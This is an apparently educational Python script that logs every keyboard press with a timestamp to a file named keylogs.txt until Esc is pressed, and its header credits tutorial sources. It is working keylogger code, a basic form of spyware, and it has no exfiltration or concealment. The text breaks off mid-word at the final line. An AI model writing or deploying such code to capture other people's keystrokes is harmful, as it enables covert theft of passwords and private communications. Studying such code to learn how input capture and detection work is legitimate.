# sources: https://www.w3schools.com/python/python_file_write.asp, https://www.w3schools.com/python/python_datetime.asp, https://www.geeksforgeeks.org/python/how-to-detect-if-a-specific-key-pressed-using-python/, https://github.com/boppreh/keyboard

import keyboard # import this module to detect key presses
import datetime # import this module to get the current date and time

logs_file = open("keylogs.txt", "w") # open the file in write mode to clear any existings logs

while True:
    with open("keylogs.txt", "a") as logs_file: # open the file in append mode to add new logs without overwriting existing ones
        keyboard_press = keyboard.read_event() # read the next keyboard event
        if keyboard_press.event_type == keyboard.KEY_DOWN: # check if the event is a key press
            logs_file.write(f"[{datetime.datetime.now()}]: '{keyboard_press.name}'\n") # write the current date and time along with the name of the key that was pressed to log file
        if keyboard_press.name == "esc": # end keylog tracking if esc is pressed
            brea